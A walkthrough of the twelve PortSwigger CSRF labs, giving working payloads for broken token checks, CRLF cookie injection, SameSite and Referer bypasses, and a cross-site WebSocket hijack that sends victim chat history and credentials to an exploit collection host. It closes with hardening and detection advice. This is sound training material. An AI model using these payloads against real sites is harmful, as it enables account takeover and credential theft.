# PortSwigger CSRF 1-12 — Tokens, SameSite, Referer, and Site Boundaries

This is a consolidated walkthrough of the twelve PortSwigger Cross-site request forgery labs.

**CSRF is a state-transition boundary bug.** A browser can be induced to send authenticated state-changing requests when the application mistakes token presence, cookie behavior, or header strings for user intent.

All twelve labs were solved. The sibling-domain CSWSH lab was completed without Collaborator by using the Academy exploit server access log as the collection channel.

## 1. Overview

| # | Lab | Boundary | Core idea |
|---|-----|----------|-----------|
| 1 | no defenses | no token | auto-submit a POST form |
| 2 | token validation depends on method | POST-only token check | switch to GET |
| 3 | validation depends on token presence | optional token check | omit the `csrf` parameter |
| 4 | token not tied to session | token/session mismatch | reuse attacker account token in victim form |
| 5 | token tied to non-session cookie | `csrfKey` cookie | inject victim `csrfKey` via CRLF `Set-Cookie` |
| 6 | token duplicated in cookie | body equals cookie | inject fake cookie and matching body token |
| 7 | SameSite Lax method override | top-level GET exception | GET navigation plus `_method=POST` |
| 8 | SameSite Strict client-side redirect | same-site gadget | target-site redirect turns cross-site first hop into same-site second hop |
| 9 | SameSite Strict sibling domain | same-site sibling XSS + CSWSH | reflected XSS on `cms-` sibling opens authenticated WebSocket |
| 10 | SameSite Lax cookie refresh | new-cookie grace period | click-triggered OAuth refresh, then cross-site POST |
| 11 | Referer required only if present | fail-open Referer check | suppress Referer |
| 12 | broken Referer validation | substring check | put target hostname in exploit URL query and use `Referrer-Policy: unsafe-url` |

## 2. Token validation failures

The first lab has no CSRF control:

```html
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="csrf1@example.net">
</form>
<script>document.forms[0].submit()</script>
```

The next three labs show common broken token checks:

- method-dependent validation: POST checks token, GET does not;
- presence-dependent validation: invalid token is rejected, missing token is accepted;
- session-independent token: a token from the attacker account is accepted in the victim session.

The defensive rule is strict: a state-changing request without a valid token for that session and action must fail.

## 3. Cookie-bound token mistakes

The `csrfKey` lab binds the token to a separate cookie, not the session. A search endpoint reflects input into `Set-Cookie`, so the attacker can set the victim's `csrfKey` and submit the matching attacker token:

```text
/?search=test%0d%0aSet-Cookie:%20csrfKey=<key>%3b%20SameSite=None%3b%20Secure
```

The duplicated-cookie lab is weaker: the server only compares body `csrf` with cookie `csrf`. A fake pair is enough:

```html
<input type="hidden" name="csrf" value="fake-token">
<img src="https://LAB/?search=test%0d%0aSet-Cookie:%20csrf=fake-token%3b%20SameSite=None%3b%20Secure"
     onerror="document.forms[0].submit()">
```

Tokens are not secrets if the attacker can choose the cookie state they are compared against.

## 4. SameSite bypasses

SameSite is a browser cookie delivery policy, not an application authorization model.

For default Lax cookies, top-level GET navigation still includes the cookie. If the server supports method override:

```html
<script>
document.location = "https://LAB/my-account/change-email?email=csrf7@example.net&_method=POST";
</script>
```

For Strict cookies, a target-site gadget can convert a cross-site first hop into a same-site second hop. The comment confirmation page builds a client-side redirect from `postId`:

```html
<script>
document.location =
  "https://LAB/post/comment/confirmation?postId=1/../../my-account/change-email?email=csrf8@example.net%26submit=1";
</script>
```

The sibling-domain lab combines reflected XSS on `cms-LAB` with a WebSocket on `LAB`. Because both hosts are same-site, the WebSocket handshake includes the victim session cookie:

```js
var ws = new WebSocket('wss://LAB/chat');
ws.onopen = function(){ ws.send('READY') };
ws.onmessage = function(event){
  fetch('https://EXPLOIT/collect?m=' + encodeURIComponent(event.data), {mode:'no-cors'});
};
```

The official solution uses Collaborator for collection. In this run, the exploit server access log captured the chat history, including the victim credential message, and login completed the lab.

The cookie-refresh lab uses the two-minute Lax grace period for newly issued cookies. `/social-login` refreshes the session cookie, but popup blockers require a click:

```html
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="csrf10@example.net">
</form>
<p>Click anywhere on the page</p>
<script>
window.onclick = function(){
  window.open('https://LAB/social-login');
  setTimeout(function(){ document.forms[0].submit() }, 5000);
};
</script>
```

## 5. Referer validation bugs

If the application rejects a bad Referer but accepts a missing one, suppress it:

```html
<meta name="referrer" content="no-referrer">
```

If it only checks whether the Referer string contains the target hostname, make the exploit page URL contain that hostname and force the browser to send the full URL:

```http
Referrer-Policy: unsafe-url
```

```html
<script>history.pushState("", "", "/?LAB.web-security-academy.net")</script>
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="csrf12@example.net">
</form>
<script>document.forms[0].submit()</script>
```

Referer checks should parse and compare origins. Substring checks are not origin checks.

## 6. Operational notes

- Token extraction automation must handle unquoted HTML attributes such as `name=csrf value=...`.
- curl cookie jars mark HttpOnly cookies with `#HttpOnly_`; do not discard them as comments when parsing `csrfKey`.
- In the client-side redirect lab, encode `&submit=1` as `%26submit=1` so it remains inside the `postId` parameter.
- In the sibling-domain lab, encode single quotes inside the inner payload before placing it inside an outer JavaScript string.
- For the chat-history lab, the useful credential phrase was "No problem carlos, it's ...", not a literal "password is ..." string.
- The OAuth refresh lab needs a user click before `window.open()` or the popup is blocked.

## 7. Defense and detection

### Hardening

- Require valid CSRF tokens for every state-changing request and bind them to server-side session, user, action, method, and lifetime.
- Reject missing tokens. Do not only validate tokens when the parameter is present.
- Do not bind tokens solely to non-session cookies or compare them with attacker-controlled cookie values.
- Do not allow method override to change the security semantics of GET requests.
- Treat SameSite as defense in depth, not as the primary CSRF control.
- Validate `Origin` and `Referer` fail-closed, using parsed origins rather than string containment.
- Protect WebSocket handshakes with Origin validation and/or a CSRF token.
- Treat sibling domains as the same risk boundary for XSS and cookie policy.

### Detection ideas

- State-changing GET requests or `_method=POST` on account endpoints.
- Sensitive requests with missing token, missing Referer, or malformed Referer that still succeed.
- CRLF-injected `Set-Cookie` patterns in search/reflection endpoints.
- Cross-site sensitive requests visible through `Sec-Fetch-Site`, `Origin`, or Referer anomalies.
- OAuth/login refresh immediately followed by cross-site account changes.
- WebSocket chat handshakes from sibling domains followed by bulk history retrieval.

The durable takeaway is that CSRF defenses must validate the server-side state transition, not just the surface signal that happened to accompany one normal form submission.
